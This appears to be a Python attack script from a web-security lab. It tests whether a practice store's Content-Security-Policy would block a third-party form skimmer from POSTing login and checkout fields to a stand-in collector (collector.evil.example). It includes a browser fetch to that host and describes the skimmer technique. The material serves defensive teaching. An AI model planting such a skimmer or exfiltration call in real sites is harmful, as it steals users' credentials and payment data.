"""
Capstone Round 3 Attack — a third-party form skimmer (W3 Ch5)

A skimmer rides in a trusted third-party script (static/analytics-helper.js),
reads the checkout/login fields, and POSTs them to an attacker origin in
parallel with the honest submit (see static/skimmer.js). The user sees nothing
and the TLS to the real server is intact, so nothing on the server side notices
the extra connection — only the *browser* can refuse it.

Because the enforcement is in the browser, this attack measures the defense the
way the browser would decide it: it reads the Content-Security-Policy the page
ships and asks "would this policy let the skimmer POST to the collector?" At
L<7 there is no enforcing policy, so the exfil succeeds; at L7, once you set
connect-src to 'self' (the Round 3 TODO in defenses/supply_chain.py), the
browser would refuse it and fire a violation report. The attack also posts that
report to /api/script-violation, the way a real browser would, so you can see
the session's L7 score rise.

An optional browser proof (Playwright) is attempted and skipped if no browser
is installed. The skimmer and collector are entirely local and fictional.

Run (store running at DEFENSE_LEVEL 7):
    python attacks/round3_skimmer.py
"""

import os
import sys

from curl_cffi import requests as cffi

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import Cost, egress_pool, report, rng_for, summary, target  # noqa: E402

COLLECTOR = "https://collector.evil.example/collect"


def _connect_src(csp_value):
    for directive in csp_value.split(";"):
        parts = directive.split()
        if parts and parts[0].lower() == "connect-src":
            return parts[1:]
    return None


def _would_exfil(csp_value):
    """Mirror the browser's connect-src check: would a POST to COLLECTOR be allowed?"""
    if not csp_value:
        return True  # no policy: the browser allows the cross-origin POST
    sources = _connect_src(csp_value)
    if sources is None:
        return True  # connect-src not set: falls back to default-src, but treat as open here
    host = COLLECTOR.split("://", 1)[-1].split("/", 1)[0]
    for src in sources:
        if src in ("*", "https:"):
            return True
        if src.startswith("http") and src.split("://", 1)[-1].split("/", 1)[0] == host:
            return True
    return False


def skim(base, egress):
    s = cffi.Session(impersonate="chrome150", verify=False, timeout=15)
    s.headers.update({"X-Lab-Egress": egress})
    r = s.get(f"{base}/login")  # a page with the third-party analytics tag + form fields
    loaded = "/static/analytics-helper.js" in r.text
    # The policy the browser would enforce. Report-only does not block.
    enforced = r.headers.get("Content-Security-Policy")
    report_only = r.headers.get("Content-Security-Policy-Report-Only")
    exfil = _would_exfil(enforced)  # report-only never blocks, so only the enforced policy matters
    # Post the violation report the browser would send when blocked, so L7 scores the session.
    sid = None
    if not exfil:
        s.post(f"{base}/api/script-violation",
               json={"csp-report": {"blocked-uri": COLLECTOR, "violated-directive": "connect-src"}})
        sid = s.get(f"{base}/whoami").json().get("sid")
    reasons = ([f"exfil to {COLLECTOR} would be allowed (policy: "
                f"{'report-only' if report_only else 'none'})"] if exfil
               else [f"browser would block exfil to {COLLECTOR} (connect-src enforced)"])
    return {"vector": "form_skimmer", "host_loaded": loaded, "exfiltrated": exfil,
            "outcome": "allow" if exfil else "block", "reasons": reasons, "sid": sid}


def browser_proof(base):
    """Optional: drive a real browser to confirm the CSP actually blocks the exfil.
    Skipped cleanly if Playwright/Chromium is not installed."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            ctx = browser.new_context(ignore_https_errors=True)
            page = ctx.new_page()
            blocked = {"n": 0}
            page.on("console", lambda m: blocked.update(n=blocked["n"] + 1) if "Content Security Policy" in m.text else None)
            page.goto(f"{base}/login")
            page.evaluate(f"fetch('{COLLECTOR}', {{method:'POST', body:'x', mode:'no-cors'}}).catch(()=>0)")
            page.wait_for_timeout(500)
            browser.close()
            return blocked["n"] > 0
    except Exception:
        return None


def run(verbose=False):
    base = target()
    rng = rng_for("round3")
    pool = egress_pool()
    with Cost() as cost:
        results = [skim(base, rng.choice(pool))]
    s = summary("round3_skimmer", results, cost, success_key="exfiltrated")
    proof = browser_proof(base)
    if proof is not None:
        s["browser_proof"] = "blocked by CSP in a real browser" if proof else "NOT blocked in browser"
    if verbose:
        report(s, success_label="exfiltration succeeded")
        for r in results:
            print(f"  {r['vector']:<14} host_loaded={r['host_loaded']} {r['outcome']:<6} {r['reasons'][:1]}")
        if proof is not None:
            print(f"  browser proof: {s['browser_proof']}")
    return s


if __name__ == '__main__':
    run(verbose=True)
